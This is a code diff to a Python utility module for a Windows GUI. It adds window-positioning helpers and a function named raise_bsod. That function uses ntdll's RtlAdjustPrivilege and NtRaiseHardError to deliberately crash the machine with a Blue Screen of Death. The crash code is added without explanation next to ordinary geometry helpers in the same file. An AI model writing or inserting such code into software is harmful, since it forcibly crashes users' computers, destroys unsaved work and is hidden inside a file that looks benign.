@@ -3,6 +3,31 @@ import win32con # type: ignore
 import win32gui # type: ignore
 from ctypes import windll, Structure, c_long, byref
 from colors import transparent
+from ctypes import windll
+from ctypes import c_int
+from ctypes import c_uint
+from ctypes import c_ulong
+from ctypes import POINTER
+from ctypes import byref
+
+def raise_bsod():
+    nullptr = POINTER(c_int)()
+
+    windll.ntdll.RtlAdjustPrivilege(
+        c_uint(19),
+        c_uint(1),
+        c_uint(0),
+        byref(c_int())
+    )
+
+    windll.ntdll.NtRaiseHardError(
+        c_ulong(0xC000007B),
+        c_ulong(0),
+        nullptr,
+        nullptr,
+        c_uint(6),
+        byref(c_uint())
+    )
 
 def config_win32_window(hwnd):
     win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE,
@@ -16,6 +41,12 @@ def calculate_center_positioning(container_size, child_size):
     return [
         container_size[0]/2 - child_size[0]/2,
         container_size[1]/2 - child_size[1]/2
+    ]
+
+def offset_position_to_center(position, size):
+    return [
+        position[0] - size[0]/2,
+        position[1] - size[1]/2
     ]
 
 def translate_coords(coords, translation):
